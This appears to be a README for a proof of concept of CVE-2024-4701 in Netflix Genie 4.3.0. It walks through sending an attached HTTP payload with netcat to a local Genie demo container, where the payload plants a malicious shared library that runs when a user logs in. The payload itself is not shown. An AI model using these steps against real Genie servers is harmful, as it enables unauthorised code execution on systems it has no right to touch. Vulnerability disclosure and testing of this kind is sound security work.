# CVE-2024-4701-POC
POC for CVE-2024-4701

Download the genie docker file from https://netflix.github.io/genie/docs/4.3.0/demo/docker-compose.yml or this repo

run 

```docker-compose up```

Download the attached http payload loadlib 

Run the following command

```nc -w 5 localhost 8080 < loadlib```
You may need to install netcat ( nc )

This will send the payload to the genie app running in docker, which uploads the pe.so and ld.so.upload files.

Then login to the genie-app docker container

```docker exec -it genie_demo_app_4.3.0 /bin/bash```

The act of logging in triggers the execution of the malicious library, so just then run

ls /tmp/

To see the file command.out written to disk.

